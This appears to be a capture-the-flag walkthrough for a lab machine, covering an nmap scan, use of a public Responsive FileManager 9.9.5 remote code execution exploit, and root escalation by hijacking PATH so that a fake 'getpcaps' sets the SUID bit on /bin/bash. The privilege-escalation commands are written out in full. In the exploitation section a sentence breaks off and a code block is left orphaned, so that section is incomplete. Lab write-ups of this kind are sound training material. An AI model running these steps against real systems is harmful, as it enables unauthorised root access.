##### Host entries
```bash
10.0.160.220
```

### Content

- Responsive FileManager 9.9.5 - Remote Code Execution (RCE)
- Path hijacking abusing binary with embedded privileges (Reverse Engineering)

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.220
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.220 ()   Status: Up
Host: 10.0.160.220 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

### Exploitation
Checking service HTTP on port 80 I discovered that there is a web application, with an Standalone Responsive Filemanager within

After some research, I found this [github advisory vulnerability](https://github.com/galoget/ResponsiveFileManager-CVE-2022-46604?tab=readme-ov-file) which redirects you to a very well written [Responsive FileManager 9.9.5 RCE](https://www.exploit-db.com/exploits/51251), which is a python script that allows you to have command execution, the only modification needed was for the URI part of the exploit by adding `/plugins` to all the :

    else:
        cprint(f"[-] The server returned Status Code: '{response.status_code}' and this text: '{response.text}'", "red")
```
And this is how it should be run to get a reverse shell:

### Privilege Escalation
For the Privilege Escalation I then proceed to execute the command `sudo -l` and I can execute a script as user root without password:
```bash
www-data@confuser:/var/www/html/plugins/source$ sudo -l
Matching Defaults entries for www-data on confuser:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on confuser:
    (ALL : ALL) NOPASSWD: /usr/local/bin/confuser
```
It is a binary, so then I decided to do some reversing using Ghidra and this is the content:
```bash
main(void)

{
  int param1;
  
  seteuid(0);
  setegid(0);
  setuid(0);
  setgid(0);
  param1 = system("/bin/ls -alR && getpcaps");
  if (param1 == 0) {
    printf("Command executed successfully.");
  }
  else {
    printf("Command execution failed or returned non-zero: %d",param1);
  }
  return 0;
}
```
Two things to consider, first commands executed which makes the binary being executed as root `seteuid` `setegid` `setuid`, and the second is the `/bin/ls -alR && getpcaps` command, so yes this is a non-classic path hijacking, because we need to execute it without sudo, at least is what it worked for me, probably because the `getpcaps` binary has the root execution itself, so first we need to create a fake `getpcaps` and give permissions:
```bash
echo 'chmod +s /bin/bash' > getpcaps

chmod +x getpcaps
```
Then we need to modify our PATH:
```bash
export PATH=/tmp:$PATH
```
Finally, all you need to do is execute the sudo command:
```bash
www-data@confuser:/tmp$ sudo /usr/local/bin/confuser
```

If the sudo command does not work blame DATABUS, however if that is the case, try running it without sudo
And we are INSIDEEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`env` command
`/root`
